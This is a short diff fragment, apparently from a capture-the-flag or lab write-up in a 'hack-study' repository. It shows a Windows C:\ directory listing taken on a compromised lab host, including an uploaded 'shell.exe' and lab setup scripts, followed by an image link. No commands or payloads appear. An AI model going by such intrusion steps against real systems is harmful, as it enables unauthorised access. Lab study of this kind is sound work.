+          dir     04/27/2022 08:22:16   Users
+          dir     04/25/2022 19:11:03   vagrant
+          dir     07/03/2022 09:51:24   Windows
+ 399kb    fil     03/21/2020 20:38:26   bootmgr
+ 1b       fil     09/15/2018 08:12:30   BOOTNXT
+ 8kb      fil     03/22/2020 04:23:43   BOOTSECT.BAK
+ 103b     fil     01/04/2022 07:47:26   delete-vagrant-user.ps1
+ 169b     fil     05/01/2022 09:11:47   dns_entries.csv
+ 448mb    fil     08/22/2022 03:34:31   pagefile.sys
+ 7kb      fil     07/03/2022 18:05:43   shell.exe
+ 1kb      fil     05/01/2022 09:17:19   thm-network-setup-dc.ps1
+```
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661140052192.jpg)
 
